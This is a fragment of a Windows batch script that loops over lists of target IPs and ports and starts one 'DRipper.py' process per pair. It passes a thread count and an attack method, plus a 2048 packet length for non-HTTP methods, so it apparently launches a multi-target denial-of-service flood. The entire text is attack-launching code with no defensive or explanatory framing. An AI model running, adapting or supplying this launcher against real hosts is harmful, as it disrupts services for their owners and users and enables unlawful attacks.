for %%i in (%IP%) DO (
for %%p in (%PORT%) DO (
if "%METHOD%" == "http" (
start "%%i | %%p" python -u DRipper.py -s %%i -p %%p -r 1 -t %THEAD% -m %METHOD%
) else (
start "%%i | %%p" python -u DRipper.py -s %%i -p %%p -r 1 -t %THEAD% -m %METHOD% -l 2048
)
)
)